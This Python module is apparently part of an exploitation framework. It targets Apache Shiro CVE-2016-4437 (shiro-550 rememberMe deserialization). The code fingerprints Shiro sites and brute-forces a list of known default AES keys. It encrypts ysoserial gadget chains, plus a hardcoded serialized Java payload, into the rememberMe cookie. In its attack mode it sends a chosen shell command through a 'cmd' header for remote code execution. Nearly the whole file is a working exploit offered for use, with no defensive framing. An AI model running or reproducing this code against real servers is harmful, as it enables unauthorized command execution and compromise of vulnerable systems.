from ClassCongregation import ysoserial_payload,Ceye
from util.ExpRequest import ExpRequest,Output
from Crypto.Cipher import AES
import util.globalvar as GlobalVar
import base64
import uuid
import binascii
"""
CommonsBeanutils1
CommonsCollections1
CommonsCollections2
CommonsCollections3
CommonsCollections4
CommonsCollections5
CommonsCollections6
CommonsCollections7
CommonsCollections8
CommonsCollections9
CommonsCollections10
--------------------
SpringEcho1
SpringEcho2
Tomcat6Echo
Tomcat7_8Echo
Tomcat9Echo
WeblogicEcho1
"""
GlobalVar.set_value('key', "kPH+bIxk5D2deZiIxcaaaA==")
GlobalVar.set_value('gadget', "CommonsBeanutils2")
GlobalVar.set_value('echo', "Tomcat7_8Echo")

class ApacheShiro():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.flag = GlobalVar.get_value('flag')
        self.win_cmd = 'cmd /c '+ env.get('cmd', 'echo ' + self.flag)
        self.linux_cmd = env.get('cmd', 'echo ' + self.flag)

    #检测是否存在漏洞
    def cve_2016_4437(self):
        appName = 'ApacheShiro'
        pocname = 'cve_2016_4437'
        method = 'post'
        desc = '<= 1.2.4, shiro-550, rememberme deserialization rce'
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        #反序列化利用组件
        key_lists = ['L7RioUULEFhRyxM7a2R/Yg==','kPH+bIxk5D2deZiIxcaaaA==', '4AvVhmFLUs0KTA3Kprsdag==', 'Z3VucwAAAAAAAAAAAAAAAA==', 'fCq+/xW488hMTCD+cmJ3aQ==', '0AvVhmFLUs0KTA3Kprsdag==', '1AvVhdsgUs0FSA3SDFAdag==', '1QWLxg+NYmxraMoxAXu/Iw==', '25BsmdYwjnfcWmnhAciDDg==', '2AvVhdsgUs0FSA3SDFAdag==', '3AvVhmFLUs0KTA3Kprsdag==', '3JvYhmBLUs0ETA5Kprsdag==', 'r0e3c16IdVkouZgk1TKVMg==', '5aaC5qKm5oqA5pyvAAAAAA==', '5AvVhmFLUs0KTA3Kprsdag==', '6AvVhmFLUs0KTA3Kprsdag==', '6NfXkC7YVCV5DASIrEm1Rg==', '6ZmI6I2j5Y+R5aSn5ZOlAA==', 'cmVtZW1iZXJNZQAAAAAAAA==', '7AvVhmFLUs0KTA3Kprsdag==', '8AvVhmFLUs0KTA3Kprsdag==', '8BvVhmFLUs0KTA3Kprsdag==', '9AvVhmFLUs0KTA3Kprsdag==', 'OUHYQzxQ/W9e/UjiAGu6rg==', 'a3dvbmcAAAAAAAAAAAAAAA==', 'aU1pcmFjbGVpTWlyYWNsZQ==', 'bWljcm9zAAAAAAAAAAAAAA==', 'bWluZS1hc3NldC1rZXk6QQ==', 'bXRvbnMAAAAAAAAAAAAAAA==', 'ZUdsaGJuSmxibVI2ZHc9PQ==', 'wGiHplamyXlVB11UXWol8g==', 'U3ByaW5nQmxhZGUAAAAAAA==', 'MTIzNDU2Nzg5MGFiY2RlZg==', 'a2VlcE9uR29pbmdBbmRGaQ==', 'WcfHGU25gNnTxTlmJMeSpw==', 'OY//C4rhfwNxCQAQCrQQ1Q==', '5J7bIJIV0LQSN3c9LPitBQ==', 'f/SY5TIve5WWzT4aQlABJA==']
        gadget_lists = ['CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'CommonsCollections8', 'CommonsCollections9', 'CommonsCollections10']
        echo_lists = ['SpringEcho1', 'SpringEcho2', 'Tomcat6Echo', 'Tomcat7_8Echo', 'Tomcat9Echo','WeblogicEcho1']
        #自定义payload
        #是否是shiro站点
        r = exprequest.get(
            self.url,
            headers={'Cookie':'rememberMe=1'},
            allow_redirects=False,
        )
        isShiro = r.headers.get('Set-Cookie', None)
        if isShiro is None or 'deleteMe' not in isShiro:
            print('[-] %s 不是shiro站点'%self.url)
            return
        #_verify
        if self.vuln == 'False':
            # url0 = ""
            # try:
            #     dnslog = Ceye()
            #     url0 = dnslog.dns_host()
            # except Exception:
            #     pass
            # if url0 == "":
            #     print('[-]获取dnslog失败,请确认网络连接!!!')
            #     return
            # url1 = 'http://' + url0
            #dnslog payload
            #payload = 'aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e00034c0004686f737471007e00034c000870726f746f636f6c71007e00034c000372656671007e00037870ffffffffffffffff740010{0}74000071007e0005740004687474707078740017{1}78'.format(binascii.hexlify(url0.encode()).decode(),binascii.hexlify(url1.encode()).decode())
            #SimplePrincipalCollection payload
            payload = 'aced0005737200326f72672e6170616368652e736869726f2e7375626a6563742e53696d706c655072696e636970616c436f6c6c656374696f6ea87f5825c6a3084a0300014c000f7265616c6d5072696e636970616c7374000f4c6a6176612f7574696c2f4d61703b78707077010078'
            payload = binascii.a2b_hex(payload)
            BS = AES.block_size
            pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
            mode = AES.MODE_CBC
            iv = uuid.uuid4().bytes
            for key in key_lists:
                try:
                    encryptor = AES.new(base64.b64decode(key), mode, iv)
                    file_body = pad(payload)
                    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)).decode()
                    # http or https
                    r = exprequest.get(
                        self.url,
                        cookies={'rememberMe':base64_ciphertext}
                    )
                    #if dnslog.result():
                    iskey = r.headers.get('Set-Cookie', '')
                    if iskey == '' or 'deleteMe' not in iskey:
                        info = "[rce]" + " [key: " + key + " ] [gadget: " + "SimplePrincipalCollection" + " ]"
                        output.no_echo_success(method, info)
                        for gadget in gadget_lists:
                            for echo in echo_lists:
                                try:
                                    gadget_payload = ysoserial_payload(gadget,"directive:"+echo)
                                    BS = AES.block_size
                                    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
                                    mode =  AES.MODE_CBC
                                    iv = uuid.uuid4().bytes
                                    encryptor = AES.new(base64.b64decode(key), mode, iv)
                                    file_body = pad(gadget_payload)
                                    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)).decode()
                                    # windows
                                    win_text = exprequest.get(
                                        self.url,
                                        headers={'cmd': self.win_cmd},
                                        cookies={'rememberMe':base64_ciphertext}
                                    ).text
                                    # linux
                                    linux_text = exprequest.get(
                                        self.url,
                                        headers={'cmd': self.linux_cmd},
                                        cookies={'rememberMe':base64_ciphertext}
                                    ).text

                                    if self.flag in win_text or self.flag in linux_text:
                                        GlobalVar.set_value('key', key)
                                        GlobalVar.set_value('gadget', gadget)
                                        GlobalVar.set_value('echo', echo)
                                        info = "[rce]" + " [key: " + key + " ] [gadget: " + gadget + " ] [echo: "+ echo + " ]"
                                        return output.echo_success(method, info)
                                #能够进入此处,说明存在利用key.为了排除其他因素影响,忽略异常
                                except:
                                    pass
                        return output.fail('Not found gadget')
                    else:
                        #pass
                        output.result_error('%s is incorrect'%key)
                #验证key的过程中发生异常后,跳过该key
                except Exception as e:
                    output.result_error('%s is skipped %s'%(key,type(e)))
                    continue
            return output.fail('Not found key')
        #_attack
        else:
            #指定攻击参数
            key = GlobalVar.get_value('key')
            gadget = GlobalVar.get_value('gadget')
            echo = GlobalVar.get_value('echo')
            gadget_payload = ysoserial_payload(gadget,"directive:" + echo)
            BS = AES.block_size
            pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
            mode = AES.MODE_CBC
            iv = uuid.uuid4().bytes
            encryptor = AES.new(base64.b64decode(key), mode, iv)
            file_body = pad(gadget_payload)
            base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)).decode()

            text = exprequest.get(
                self.url,
                headers={'cmd': self.cmd},
                cookies={'rememberMe':base64_ciphertext}
            ).text
            #print(text)
            if '<!DOCTYPE' in text:
                result = text[:text.find('<!DOCTYPE')].strip()
                print(result)
            else:
                print(text)

print("""
+-------------------+------------------+------+--------+-------------------------------------------------------------+
| AppName           | Pocname          | Path | Method | Impact Version && Vulnerability description                 |
+-------------------+------------------+------+--------+-------------------------------------------------------------+
| Apache Shiro      | cve_2016_4437    |  /   |  post  | <= 1.2.4, shiro-550, rememberme deserialization rce         |
+-------------------+------------------+------+--------+-------------------------------------------------------------+""")

def check(**kwargs):
    thread_list = []
    ExpApacheShiro = ApacheShiro(**kwargs)
    #调用单个函数
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(ExpApacheShiro, kwargs['pocname'])))
    #调用所有函数
    else:
        for func in dir(ApacheShiro):
            if not func.startswith("__"):
                thread_list.append(kwargs['pool'].submit(getattr(ExpApacheShiro, func)))
    #保存全局子线程列表
    GlobalVar.add_value('thread_list', thread_list)